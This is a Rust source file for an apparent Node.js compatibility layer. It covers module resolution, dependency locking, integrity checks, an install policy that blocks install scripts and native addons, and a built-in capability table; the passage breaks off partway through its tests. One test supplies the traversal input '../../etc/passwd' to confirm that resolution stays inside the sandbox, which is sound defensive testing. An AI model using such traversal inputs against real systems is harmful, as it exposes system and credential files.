//! Aldivine Node compatibility runtime — the engine-independent half.
//!
//! What this crate actually is:
//!
//! * Node compatibility **profiles** (node16 legacy / node22 modern), derived
//!   from the manifest `node_version` directive.
//! * `package.json` parsing and `engines` enforcement against a profile.
//! * The real **Node module resolution algorithm** — relative/absolute probing
//!   with extension and directory handling, plus `node_modules` upward walk —
//!   written against a `NodeFileSource` interface so the same code runs over
//!   the Aldivine VFS in production and an in-memory map in tests.
//! * Deterministic **dependency resolution**: locked versions win, ranges are
//!   matched with real semver, output order is canonical.
//! * npm-style **integrity** (`sha512-<base64>`) verification and the
//!   content-addressed cache path an installed package lands on.
//! * **Install policy**: postinstall scripts off by default, native addons
//!   (.node) refused unless explicitly permitted and architecture-matched.
//! * A **built-in capability table**: which Node built-ins a resource may
//!   reach, which are capability-gated by the host, and which are denied.
//!
//! What this crate is NOT, deliberately:
//!
//! * It does not execute JavaScript. There is no V8 in this build and no
//!   bundled Node binary, so `require()` is resolved and authorized here but
//!   the evaluation of the resolved module is the job of the embedded engine
//!   integration, which is **BLOCKED_EXTERNAL** until an engine is vendored
//!   (see `docs/NODE_COMPATIBILITY.md`). Claiming otherwise would be exactly
//!   the placeholder compatibility the spec forbids.
//! * It does not download packages. Registry transport is a separate concern;
//!   this crate verifies what a download produced and where it belongs.
//!
//! QuickJS is not Node.js. This crate does not pretend it is.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256, Sha512};
use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, thiserror::Error)]
pub enum NodeError {
    #[error("invalid package.json: {0}")]
    PackageJson(String),
    #[error("unsupported node_version `{0}`: no compatibility profile")]
    UnsupportedNodeVersion(String),
    #[error("package `{name}` requires node `{required}` but profile {profile} does not satisfy it")]
    EngineMismatch { name: String, required: String, profile: String },
    #[error("module `{0}` could not be resolved")]
    NotFound(String),
    #[error("invalid integrity string `{0}`")]
    Integrity(String),
    #[error("integrity mismatch for `{0}`")]
    IntegrityMismatch(String),
    #[error("dependency conflict on `{0}`: locked version does not satisfy any requested range")]
    Conflict(String),
    #[error("package `{0}` would run an install script but install scripts are disabled by policy")]
    InstallScriptDisabled(String),
    #[error("package `{0}` contains a native addon ({1}) but native addons are not permitted by policy")]
    NativeAddonBlocked(String, String),
    #[error("native addon `{0}` targets `{1}` but the host architecture is `{2}`")]
    NativeAddonArchMismatch(String, String, String),
}

// ---------------------------------------------------------------------------
// Compatibility profiles
// ---------------------------------------------------------------------------

/// The two compatibility profiles the spec calls for. Legacy server
/// JavaScript was written against Node 16; modern resources target Node 22.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum NodeProfile {
    /// Legacy profile: Node 16 semantics.
    Node16,
    /// Modern profile: Node 22 semantics.
    Node22,
}

impl NodeProfile {
    pub fn as_str(self) -> &'static str {
        match self {
            NodeProfile::Node16 => "node16",
            NodeProfile::Node22 => "node22",
        }
    }

    /// The engine version this profile presents to `process.version`.
    pub fn version(self) -> &'static str {
        match self {
            NodeProfile::Node16 => "16.20.2",
            NodeProfile::Node22 => "22.11.0",
        }
    }

    /// Whether `node:test`, `fetch` and other modern globals exist. Node 16
    /// has no global `fetch` and no `node:` import scheme.
    pub fn has_global_fetch(self) -> bool {
        matches!(self, NodeProfile::Node22)
    }

    /// Whether the `node:` specifier prefix is recognized.
    pub fn has_node_prefix(self) -> bool {
        matches!(self, NodeProfile::Node22)
    }

    /// Map a manifest `node_version` declaration onto a profile.
    ///
    /// Accepts the forms real manifests use: `'22'`, `'16'`, `'16.20'`,
    /// `'>=18'`. Unknown majors are rejected rather than silently defaulted —
    /// running a resource under the wrong semantics is a compatibility bug
    /// that shows up much later.
    pub fn from_manifest(value: &str) -> Result<Self, NodeError> {
        let v = value.trim().trim_start_matches('v');
        let digits: String =
            v.trim_start_matches(|c: char| !c.is_ascii_digit()).chars().take_while(|c| c.is_ascii_digit()).collect();
        match digits.as_str() {
            "16" | "17" | "18" => Ok(NodeProfile::Node16),
            "20" | "22" | "23" | "24" => Ok(NodeProfile::Node22),
            _ => Err(NodeError::UnsupportedNodeVersion(value.to_string())),
        }
    }
}

/// A resolved runtime choice for one resource, with the reason recorded so the
/// F8 console and Aegis can show *why* a profile was picked.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ProfileSelection {
    pub profile: NodeProfile,
    pub declared: Option<String>,
    pub reason: String,
}

/// Pick a profile for a resource from its manifest declaration.
pub fn select_profile(declared: Option<&str>) -> Result<ProfileSelection, NodeError> {
    match declared {
        Some(v) => Ok(ProfileSelection {
            profile: NodeProfile::from_manifest(v)?,
            declared: Some(v.to_string()),
            reason: format!("manifest declared node_version '{v}'"),
        }),
        None => Ok(ProfileSelection {
            profile: NodeProfile::Node16,
            declared: None,
            reason: "no node_version declared; legacy Node 16 profile assumed".into(),
        }),
    }
}

// ---------------------------------------------------------------------------
// package.json
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct PackageJson {
    pub name: String,
    pub version: Option<String>,
    pub main: Option<String>,
    #[serde(default)]
    pub scripts: BTreeMap<String, String>,
    #[serde(default)]
    pub dependencies: BTreeMap<String, String>,
    #[serde(default)]
    pub dev_dependencies: BTreeMap<String, String>,
    #[serde(default)]
    pub optional_dependencies: BTreeMap<String, String>,
    #[serde(default)]
    pub engines: BTreeMap<String, String>,
    /// The package's own declared cpu/os targets, used for native addon checks.
    pub cpu: Vec<String>,
    pub os: Vec<String>,
}

impl PackageJson {
    /// Scripts that execute during install. These are the ones disabled by
    /// default; `build`/`test` etc. are not install-time.
    pub fn install_scripts(&self) -> Vec<(&str, &str)> {
        ["preinstall", "install", "postinstall", "prepare"]
            .iter()
            .filter_map(|k| self.scripts.get(*k).map(|v| (*k, v.as_str())))
            .collect()
    }

    pub fn all_runtime_deps(&self) -> BTreeMap<String, String> {
        let mut out = self.dependencies.clone();
        for (k, v) in &self.optional_dependencies {
            out.entry(k.clone()).or_insert_with(|| v.clone());
        }
        out
    }
}

pub fn parse_package_json(src: &str) -> Result<PackageJson, NodeError> {
    #[derive(Deserialize)]
    struct Raw {
        #[serde(default)]
        name: String,
        #[serde(default)]
        version: Option<String>,
        #[serde(default)]
        main: Option<String>,
        #[serde(default)]
        scripts: BTreeMap<String, String>,
        #[serde(default)]
        dependencies: BTreeMap<String, String>,
        #[serde(default, rename = "devDependencies")]
        dev_dependencies: BTreeMap<String, String>,
        #[serde(default, rename = "optionalDependencies")]
        optional_dependencies: BTreeMap<String, String>,
        #[serde(default)]
        engines: BTreeMap<String, String>,
        #[serde(default)]
        cpu: Vec<String>,
        #[serde(default)]
        os: Vec<String>,
    }
    let raw: Raw = serde_json::from_str(src).map_err(|e| NodeError::PackageJson(e.to_string()))?;
    if raw.name.is_empty() {
        return Err(NodeError::PackageJson("missing `name`".into()));
    }
    Ok(PackageJson {
        name: raw.name,
        version: raw.version,
        main: raw.main,
        scripts: raw.scripts,
        dependencies: raw.dependencies,
        dev_dependencies: raw.dev_dependencies,
        optional_dependencies: raw.optional_dependencies,
        engines: raw.engines,
        cpu: raw.cpu,
        os: raw.os,
    })
}

/// Enforce `engines.node` against the selected profile.
///
/// A package that cannot run under the profile is refused up front: the
/// alternative is a resource that loads and then behaves subtly differently
/// from what its author tested.
pub fn check_engines(pkg: &PackageJson, profile: NodeProfile) -> Result<(), NodeError> {
    let Some(req) = pkg.engines.get("node") else {
        return Ok(());
    };
    let req = semver::VersionReq::parse(req).map_err(|e| NodeError::EngineMismatch {
        name: pkg.name.clone(),
        required: req.clone(),
        profile: format!("{} (unparsable: {e})", profile.as_str()),
    })?;
    let ver = semver::Version::parse(profile.version()).expect("profile version is valid semver");
    if req.matches(&ver) {
        Ok(())
    } else {
        Err(NodeError::EngineMismatch {
            name: pkg.name.clone(),
            required: pkg.engines["node"].clone(),
            profile: format!("{} ({})", profile.as_str(), profile.version()),
        })
    }
}

// ---------------------------------------------------------------------------
// Module resolution
// ---------------------------------------------------------------------------

/// The filesystem the resolver walks. In production this is backed by
/// `ald-vfs` (so every probe is sandbox-checked); in tests it is a map.
/// Keeping this an interface means resolution is testable without a real
/// `node_modules` tree and without touching the disk.
pub trait NodeFileSource {
    /// Read a file by virtual path (`/resource/node_modules/x/index.js`).
    fn read(&self, path: &str) -> Option<Vec<u8>>;
    /// Whether a virtual path names a directory.
    fn is_dir(&self, path: &str) -> bool;
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ResolveKind {
    JavaScript,
    Json,
    /// A `.node` native addon: resolved, and flagged so the install policy can
    /// refuse it unless explicitly permitted.
    NativeAddon,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Resolved {
    pub path: String,
    pub kind: ResolveKind,
    /// True when the path came from a `node_modules` directory (a dependency),
    /// false for a resource-local file.
    pub from_node_modules: bool,
}

const PROBE_EXTS: [(&str, ResolveKind); 3] =
    [(".js", ResolveKind::JavaScript), (".json", ResolveKind::Json), (".node", ResolveKind::NativeAddon)];

/// Resolve a `require()` specifier using Node's algorithm.
///
/// * `./x`, `../x`, `/x` — file probing with extensions, then directory
///   handling (`package.json` `main`, then `index.*`).
/// * anything else — bare specifier: walk `node_modules` upward from
///   `from_dir`. Supports scoped names (`@scope/pkg`) and subpaths
///   (`pkg/lib/thing`).
pub fn resolve(spec: &str, from_dir: &str, fs: &impl NodeFileSource) -> Result<Resolved, NodeError> {
    if spec.is_empty() {
        return Err(NodeError::NotFound(spec.to_string()));
    }
    let relative = spec.starts_with("./") || spec.starts_with("../") || spec == "." || spec == "..";
    let absolute = spec.starts_with('/');
    if relative || absolute {
        let base = if absolute { spec.to_string() } else { join(from_dir, spec) };
        return load_as_file_or_dir(&base, fs, false).ok_or_else(|| NodeError::NotFound(spec.into()));
    }

    // Bare specifier: split the package name from any subpath.
    let mut it = spec.splitn(2, '/');
    let first = it.next().unwrap_or("");
    let (pkg_name, rest) = if first.starts_with('@') {
        match it.next() {
            // `@scope/pkg/rest`
            Some(second_and_rest) => match second_and_rest.split_once('/') {
                Some((second, rest)) => (format!("{first}/{second}"), Some(rest.to_string())),
                None => (format!("{first}/{second_and_rest}"), None),
            },
            None => return Err(NodeError::NotFound(spec.into())),
        }
    } else {
        (first.to_string(), it.next().map(str::to_string))
    };
    if pkg_name.is_empty() {
        return Err(NodeError::NotFound(spec.into()));
    }

    let mut dir = from_dir.to_string();
    loop {
        let root = format!("{}/node_modules/{pkg_name}", trim_slash(&dir));
        let target = match &rest {
            Some(r) => format!("{root}/{r}"),
            None => root.clone(),
        };
        if let Some(r) = load_as_file_or_dir(&target, fs, true) {
            return Ok(r);
        }
        // Walk up. `/node_modules` upstream of the resource root is not
        // reachable: the VFS root is the resource, so the walk terminates.
        let parent = parent_of(&dir);
        if parent == dir {
            break;
        }
        dir = parent;
    }
    Err(NodeError::NotFound(spec.into()))
}

fn trim_slash(p: &str) -> String {
    if p == "/" {
        "/".to_string()
    } else {
        p.trim_end_matches('/').to_string()
    }
}

fn parent_of(dir: &str) -> String {
    let d = trim_slash(dir);
    if d == "/" || d.is_empty() {
        return "/".to_string();
    }
    match d.rsplit_once('/') {
        Some(("", _)) => "/".to_string(),
        Some((parent, _)) => parent.to_string(),
        None => "/".to_string(),
    }
}

/// Join a relative specifier onto a directory, collapsing `.` and `..`.
/// Sequence-sanitized here rather than trusting the caller; the VFS re-checks
/// containment afterwards regardless.
fn join(dir: &str, rel: &str) -> String {
    let cleaned = trim_slash(dir);
    let mut parts: Vec<&str> = cleaned.split('/').filter(|s| !s.is_empty()).collect();
    for seg in rel.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            other => parts.push(other),
        }
    }
    format!("/{}", parts.join("/"))
}

fn ext_of(path: &str) -> Option<&str> {
    let name = path.rsplit('/').next().unwrap_or(path);
    name.rfind('.').map(|i| &name[i..])
}

/// Try `base` as a file (exact, then with probed extensions), then as a
/// directory (`package.json` main, then `index.*`).
fn load_as_file_or_dir(base: &str, fs: &impl NodeFileSource, from_node_modules: bool) -> Option<Resolved> {
    // 1. exact file
    if let Some(bytes) = fs.read(base) {
        let kind = match ext_of(base) {
            Some(".json") => ResolveKind::Json,
            Some(".node") => ResolveKind::NativeAddon,
            _ => ResolveKind::JavaScript,
        };
        let _ = bytes;
        return Some(Resolved { path: base.to_string(), kind, from_node_modules });
    }
    // 2. extension probing
    for (ext, kind) in PROBE_EXTS {
        let cand = format!("{base}{ext}");
        if fs.read(&cand).is_some() {
            return Some(Resolved { path: cand, kind, from_node_modules });
        }
    }
    // 3. directory
    if fs.is_dir(base) {
        let pj = format!("{}/package.json", trim_slash(base));
        if let Some(bytes) = fs.read(&pj) {
            if let Ok(src) = String::from_utf8(bytes) {
                if let Ok(pkg) = parse_package_json(&src) {
                    if let Some(main) = pkg.main {
                        let target = join(base, &main);
                        if let Some(r) = load_as_file_or_dir(&target, fs, from_node_modules) {
                            return Some(r);
                        }
                        // main present but unresolvable: fall through to index
                    }
                }
            }
        }
        for (ext, kind) in PROBE_EXTS {
            let cand = format!("{}/index{}", trim_slash(base), ext);
            if fs.read(&cand).is_some() {
                return Some(Resolved { path: cand, kind, from_node_modules });
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Dependency graph
// ---------------------------------------------------------------------------

/// One entry of an `aldivine.lock`-style dependency record.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct LockedPackage {
    pub name: String,
    pub version: semver::Version,
    pub resolved: String,
    pub integrity: String,
}

/// Outcome of resolving declared ranges against locked versions.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DependencyPlan {
    /// Canonical, name-sorted install order. Deterministic by construction.
    pub install_order: Vec<LockedPackage>,
    /// Ranges that no locked version satisfied. Non-empty means the lock is
    /// stale and the plan must not be applied.
    pub unsatisfied: Vec<(String, String)>,
}

/// Resolve `dependencies` ranges against locked versions.
///
/// Locked versions win: a plan never silently upgrades. A range with no
/// satisfying lock entry is reported as unsatisfied rather than resolved from
/// the network, so an offline or stale-lock install fails loudly.
pub fn plan_dependencies(dependencies: &BTreeMap<String, String>, locked: &[LockedPackage]) -> DependencyPlan {
    let by_name: BTreeMap<&str, &LockedPackage> = locked.iter().map(|l| (l.name.as_str(), l)).collect();
    let mut install_order = Vec::new();
    let mut unsatisfied = Vec::new();
    for (name, range) in dependencies {
        match by_name.get(name.as_str()) {
            Some(l) => match semver::VersionReq::parse(range) {
                Ok(req) if req.matches(&l.version) => install_order.push((*l).clone()),
                _ => unsatisfied.push((name.clone(), range.clone())),
            },
            None => unsatisfied.push((name.clone(), range.clone())),
        }
    }
    install_order.sort_by(|a, b| a.name.cmp(&b.name).then(a.version.cmp(&b.version)));
    install_order.dedup_by(|a, b| a.name == b.name);
    unsatisfied.sort();
    DependencyPlan { install_order, unsatisfied }
}

// ---------------------------------------------------------------------------
// Integrity + cache placement
// ---------------------------------------------------------------------------

/// A parsed npm-style integrity string. Only `sha512` and `sha256` are
/// accepted; the spec forbids inventing cryptography, so no other algorithm
/// is honored even if a lockfile names one.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Integrity {
    pub algorithm: String,
    /// Lowercase hex digest, the form the cache path uses.
    pub hex: String,
}

pub fn parse_integrity(s: &str) -> Result<Integrity, NodeError> {
    let (algo, b64) = s.split_once('-').ok_or_else(|| NodeError::Integrity(s.to_string()))?;
    let want = match algo {
        "sha512" => 64,
        "sha256" => 32,
        _ => return Err(NodeError::Integrity(s.to_string())),
    };
    let raw = base64_decode(b64).ok_or_else(|| NodeError::Integrity(s.to_string()))?;
    if raw.len() != want {
        return Err(NodeError::Integrity(s.to_string()));
    }
    Ok(Integrity { algorithm: algo.to_string(), hex: hex_lower(&raw) })
}

/// Verify payload bytes against an integrity string.
pub fn verify_integrity(integrity: &str, bytes: &[u8]) -> Result<(), NodeError> {
    let parsed = parse_integrity(integrity)?;
    let digest = match parsed.algorithm.as_str() {
        "sha512" => Sha512::digest(bytes).to_vec(),
        "sha256" => Sha256::digest(bytes).to_vec(),
        _ => unreachable!("parse_integrity rejects other algorithms"),
    };
    if hex_lower(&digest) == parsed.hex {
        Ok(())
    } else {
        Err(NodeError::IntegrityMismatch(integrity.to_string()))
    }
}

/// Where verified content lives in the content-addressed cache. Two distinct
/// packages with identical bytes share one entry; that is the dedup the spec
/// asks for, and it falls out of content addressing rather than needing a
/// separate mechanism.
pub fn cache_path(integrity: &Integrity) -> String {
    let h = &integrity.hex;
    format!("{}/content-v2/{}/{}/{}/{}", "cache", integrity.algorithm, &h[0..2], &h[2..4], &h[4..])
}

fn hex_lower(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{b:02x}"));
    }
    s
}

/// Minimal standard-alphabet base64 decoder (padded or unpadded). Hand-written
/// because the integrity string is the only base64 this crate consumes.
fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 4 * 3 + 3);
    let mut acc: u32 = 0;
    let mut bits = 0u32;
    for c in s.bytes() {
        let v = match c {
            b'A'..=b'Z' => (c - b'A') as u32,
            b'a'..=b'z' => (c - b'a' + 26) as u32,
            b'0'..=b'9' => (c - b'0' + 52) as u32,
            b'+' => 62,
            b'/' => 63,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

// ---------------------------------------------------------------------------
// Install policy
// ---------------------------------------------------------------------------

/// Policy gates for installing a resource's Node dependencies. Defaults are
/// the safe ones the spec mandates: no install scripts, no native addons.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct InstallPolicy {
    /// Run `preinstall`/`install`/`postinstall`/`prepare`. Off by default:
    /// these execute arbitrary code with the install user's rights.
    pub allow_install_scripts: bool,
    /// Permit `.node` native addons. Off by default; requires an explicit
    /// opt-in per resource.
    pub allow_native_addons: bool,
    /// Host architecture (`x86_64-pc-windows-msvc`, `x86_64-unknown-linux-gnu`).
    pub host_target: String,
}

impl Default for InstallPolicy {
    fn default() -> Self {
        InstallPolicy { allow_install_scripts: false, allow_native_addons: false, host_target: default_target() }
    }
}

fn default_target() -> String {
    if cfg!(all(target_os = "windows", target_arch = "x86_64")) {
        "x86_64-pc-windows-msvc".into()
    } else if cfg!(all(target_os = "linux", target_arch = "x86_64")) {
        "x86_64-unknown-linux-gnu".into()
    } else {
        "unknown".into()
    }
}

/// Evaluate one package against the policy before it is staged.
///
/// `native_addons` are the `.node` paths resolution found in the package; a
/// non-empty list with addons disallowed is a hard refusal, not a warning —
/// loading an unreviewed native object into the server process is precisely
/// the boundary the spec draws.
pub fn evaluate_install(pkg: &PackageJson, native_addons: &[String], policy: &InstallPolicy) -> Result<(), NodeError> {
    if !policy.allow_install_scripts {
        if let Some((name, _)) = pkg.install_scripts().first() {
            return Err(NodeError::InstallScriptDisabled(format!("{} ({name})", pkg.name)));
        }
    }
    if !native_addons.is_empty() {
        if !policy.allow_native_addons {
            return Err(NodeError::NativeAddonBlocked(pkg.name.clone(), native_addons[0].clone()));
        }
        // Declared cpu targets, when present, must include this host.
        if !pkg.cpu.is_empty() && !pkg.cpu.iter().any(|c| policy.host_target.contains(c.as_str())) {
            return Err(NodeError::NativeAddonArchMismatch(
                pkg.name.clone(),
                pkg.cpu.join(","),
                policy.host_target.clone(),
            ));
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Built-in capability table
// ---------------------------------------------------------------------------

/// How a Node built-in is exposed to a resource.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BuiltinAccess {
    /// Available with no extra grant (pure computation, no ambient authority).
    Allowed,
    /// Available only after the host grants the named capability.
    CapabilityGated(&'static str),
    /// Not reachable from a resource at all.
    Denied,
}

/// The capability a resource must hold to reach a built-in.
pub const CAP_FS: &str = "node.fs";
pub const CAP_NET: &str = "node.net";
pub const CAP_PROCESS: &str = "node.process";
pub const CAP_CHILD: &str = "node.child_process";

/// Classify a built-in module name.
///
/// Pure-computation modules are allowed outright — gating `path` or `util`
/// buys no safety and forces every script to declare capabilities it does not
/// need. Anything touching the filesystem, the network, processes, or other
/// resources' memory is gated or denied.
pub fn builtin_access(name: &str) -> BuiltinAccess {
    let n = name.strip_prefix("node:").unwrap_or(name);
    match n {
        "assert" | "buffer" | "events" | "path" | "querystring" | "string_decoder" | "url" | "util" | "punycode" => {
            BuiltinAccess::Allowed
        }

        "crypto" => BuiltinAccess::CapabilityGated("node.crypto"),

        "fs" | "fs/promises" | "os" => BuiltinAccess::CapabilityGated(CAP_FS),

        "net" | "http" | "https" | "http2" | "dns" | "tls" | "dgram" => BuiltinAccess::CapabilityGated(CAP_NET),

        "process" => BuiltinAccess::CapabilityGated(CAP_PROCESS),

        "child_process" | "cluster" | "worker_threads" | "vm" => BuiltinAccess::CapabilityGated(CAP_CHILD),

        // No ambient authority is ever granted to these from a resource.
        "module" | "repl" | "inspector" | "v8" | "perf_hooks" | "trace_events" | "diagnostics_channel" => {
            BuiltinAccess::Denied
        }

        _ => BuiltinAccess::Denied,
    }
}

/// Every built-in this table knows about, for the compatibility matrix doc.
pub fn known_builtins() -> Vec<(&'static str, BuiltinAccess)> {
    const NAMES: [&str; 30] = [
        "assert",
        "buffer",
        "child_process",
        "cluster",
        "crypto",
        "dgram",
        "dns",
        "events",
        "fs",
        "fs/promises",
        "http",
        "http2",
        "https",
        "inspector",
        "module",
        "net",
        "os",
        "path",
        "perf_hooks",
        "process",
        "punycode",
        "querystring",
        "repl",
        "string_decoder",
        "tls",
        "trace_events",
        "url",
        "util",
        "v8",
        "vm",
    ];
    NAMES.iter().map(|n| (*n, builtin_access(n))).collect()
}

/// Is `spec` a built-in rather than a resolvable package? Mirrors Node's rule:
/// the bare name (or `node:`-prefixed name) matches a known module.
pub fn is_builtin(spec: &str) -> bool {
    let n = spec.strip_prefix("node:").unwrap_or(spec);
    !matches!(builtin_access(n), BuiltinAccess::Denied) && known_builtins().iter().any(|(k, _)| *k == n)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // --- in-memory NodeFileSource test double ----------------------------

    #[derive(Default)]
    struct MemTree {
        files: std::collections::HashMap<String, String>,
        dirs: std::collections::HashSet<String>,
    }

    impl MemTree {
        fn file(mut self, path: &str, content: &str) -> Self {
            self.files.insert(path.to_string(), content.to_string());
            let mut p = path.to_string();
            while let Some((parent, _)) = p.rsplit_once('/') {
                if parent.is_empty() {
                    break;
                }
                self.dirs.insert(parent.to_string());
                p = parent.to_string();
            }
            self
        }
        fn dir(mut self, path: &str) -> Self {
            self.dirs.insert(path.to_string());
            self
        }
    }

    impl NodeFileSource for MemTree {
        fn read(&self, path: &str) -> Option<Vec<u8>> {
            self.files.get(path).map(|s| s.as_bytes().to_vec())
        }
        fn is_dir(&self, path: &str) -> bool {
            self.dirs.contains(path)
        }
    }

    // --- profiles ---------------------------------------------------------

    #[test]
    fn profile_from_manifest_versions() {
        assert_eq!(NodeProfile::from_manifest("16").unwrap(), NodeProfile::Node16);
        assert_eq!(NodeProfile::from_manifest("22").unwrap(), NodeProfile::Node22);
        assert_eq!(NodeProfile::from_manifest("v20.11").unwrap(), NodeProfile::Node22);
        assert_eq!(NodeProfile::from_manifest(">=18").unwrap(), NodeProfile::Node16);
        assert!(matches!(NodeProfile::from_manifest("12"), Err(NodeError::UnsupportedNodeVersion(_))));
    }

    #[test]
    fn profile_semantics_differ() {
        assert!(!NodeProfile::Node16.has_global_fetch());
        assert!(NodeProfile::Node22.has_global_fetch());
        assert!(!NodeProfile::Node16.has_node_prefix());
        assert!(NodeProfile::Node22.has_node_prefix());
    }

    #[test]
    fn select_profile_defaults_to_legacy_with_reason() {
        let s = select_profile(None).unwrap();
        assert_eq!(s.profile, NodeProfile::Node16);
        assert!(s.reason.contains("no node_version"));
    }

    #[test]
    fn select_profile_rejects_unknown() {
        assert!(select_profile(Some("9")).is_err());
    }

    // --- package.json -----------------------------------------------------

    const PKG: &str = r#"{
      "name": "my-resource",
      "version": "1.2.3",
      "main": "lib/index.js",
      "scripts": { "postinstall": "node build.js" },
      "dependencies": { "lodash": "^4.17.21" },
      "engines": { "node": ">=20" }
    }"#;

    #[test]
    fn package_json_parses() {
        let p = parse_package_json(PKG).unwrap();
        assert_eq!(p.name, "my-resource");
        assert_eq!(p.main.as_deref(), Some("lib/index.js"));
        assert_eq!(p.install_scripts().len(), 1);
        assert_eq!(p.dependencies.get("lodash").map(String::as_str), Some("^4.17.21"));
    }

    #[test]
    fn package_json_requires_name() {
        assert!(parse_package_json("{}").is_err());
        assert!(parse_package_json("not json").is_err());
    }

    #[test]
    fn engines_are_enforced_against_profile() {
        let p = parse_package_json(PKG).unwrap();
        assert!(check_engines(&p, NodeProfile::Node22).is_ok());
        // engines says >=20, Node16 profile presents 16.20.2 -> refuse
        let err = check_engines(&p, NodeProfile::Node16).unwrap_err();
        assert!(matches!(err, NodeError::EngineMismatch { .. }));
    }

    #[test]
    fn missing_engines_is_permitted() {
        let p = parse_package_json(r#"{"name":"x"}"#).unwrap();
        assert!(check_engines(&p, NodeProfile::Node16).is_ok());
    }

    // --- resolution -------------------------------------------------------

    #[test]
    fn resolves_relative_file() {
        let fs = MemTree::default().file("/res/main.js", "x").file("/res/lib/a.js", "y");
        let r = resolve("./lib/a", "/res", &fs).unwrap();
        assert_eq!(r.path, "/res/lib/a.js");
        assert_eq!(r.kind, ResolveKind::JavaScript);
        assert!(!r.from_node_modules);
    }

    #[test]
    fn resolves_relative_json_exact() {
        let fs = MemTree::default().file("/res/data.json", "{}");
        let r = resolve("./data.json", "/res", &fs).unwrap();
        assert_eq!(r.kind, ResolveKind::Json);
    }

    #[test]
    fn resolves_directory_index_and_package_main() {
        let fs = MemTree::default()
            .file("/res/sub/index.js", "x")
            .file("/res/other/package.json", r#"{"name":"other","main":"entry.js"}"#)
            .file("/res/other/entry.js", "y");
        assert_eq!(resolve("./sub", "/res", &fs).unwrap().path, "/res/sub/index.js");
        assert_eq!(resolve("./other", "/res", &fs).unwrap().path, "/res/other/entry.js");
    }

    #[test]
    fn resolves_bare_from_node_modules() {
        let fs = MemTree::default()
            .file("/res/node_modules/lodash/index.js", "x")
            .file("/res/node_modules/lodash/package.json", r#"{"name":"lodash"}"#);
        let r = resolve("lodash", "/res", &fs).unwrap();
        assert_eq!(r.path, "/res/node_modules/lodash/index.js");
        assert!(r.from_node_modules);
    }

    #[test]
    fn bare_walks_up_to_parent_node_modules() {
        let fs = MemTree::default()
            .file("/res/a/b/node_modules/left-pad/index.js", "x")
            .file("/res/node_modules/top/index.js", "y");
        // direct hit in the local node_modules
        assert_eq!(resolve("left-pad", "/res/a/b", &fs).unwrap().path, "/res/a/b/node_modules/left-pad/index.js");
        // walk up: not in /res/a/b/node_modules, found in /res/node_modules
        assert_eq!(resolve("top", "/res/a/b", &fs).unwrap().path, "/res/node_modules/top/index.js");
    }

    #[test]
    fn resolves_scoped_package_and_subpath() {
        let fs = MemTree::default()
            .file("/res/node_modules/@scope/pkg/index.js", "x")
            .file("/res/node_modules/@scope/pkg/lib/deep.js", "y");
        assert_eq!(resolve("@scope/pkg", "/res", &fs).unwrap().path, "/res/node_modules/@scope/pkg/index.js");
        assert_eq!(
            resolve("@scope/pkg/lib/deep", "/res", &fs).unwrap().path,
            "/res/node_modules/@scope/pkg/lib/deep.js"
        );
    }

    #[test]
    fn resolves_native_addon_and_flags_it() {
        // A real native package points at its addon through package.json main;
        // `require('bcrypt')` with only a bare .node file would not resolve in
        // Node either, so the fixture mirrors the real layout.
        let fs = MemTree::default()
            .file("/res/node_modules/bcrypt/package.json", r#"{"name":"bcrypt","main":"bcrypt.node"}"#)
            .file("/res/node_modules/bcrypt/bcrypt.node", "MZ");
        let r = resolve("bcrypt", "/res", &fs).unwrap();
        assert_eq!(r.path, "/res/node_modules/bcrypt/bcrypt.node");
        assert_eq!(r.kind, ResolveKind::NativeAddon);

        // and the addon is refused by the default install policy
        let pkg = parse_package_json(r#"{"name":"bcrypt","main":"bcrypt.node"}"#).unwrap();
        assert!(matches!(
            evaluate_install(&pkg, std::slice::from_ref(&r.path), &InstallPolicy::default()),
            Err(NodeError::NativeAddonBlocked(_, _))
        ));
    }

    #[test]
    fn unresolved_module_is_an_error_not_a_noop() {
        let fs = MemTree::default().file("/res/main.js", "x");
        assert!(matches!(resolve("./nope", "/res", &fs), Err(NodeError::NotFound(_))));
        assert!(matches!(resolve("not-installed", "/res", &fs), Err(NodeError::NotFound(_))));
        assert!(resolve("", "/res", &fs).is_err());
    }

    #[test]
    fn traversal_in_specifier_cannot_escape_the_resource_root() {
        // `../../etc/passwd` from /res collapses to nothing above the root.
        let fs = MemTree::default().file("/res/main.js", "x");
        let err = resolve("../../etc/passwd", "/res", &fs);
        assert!(err.is_err(), "bare-looking traversal must not resolve");
        // a real relative escape also fails to find anything outside the root
        assert!(resolve("../../../outside.js", "/res", &fs).is_err());
    }

    #[test]
    fn parent_and_join_collapse() {
        assert_eq!(parent_of("/res/a/b"), "/res/a");
        assert_eq!(parent_of("/res"), "/");
        assert_eq!(parent_of("/"), "/");
        assert_eq!(join("/res", "../x"), "/x");
        assert_eq!(join("/res/a", "./b/../c"), "/res/a/c");
        // cannot climb above root
        assert_eq!(join("/", "../../x"), "/x");
    }

    // --- dependency planning ---------------------------------------------

    fn lock(name: &str, ver: &str) -> LockedPackage {
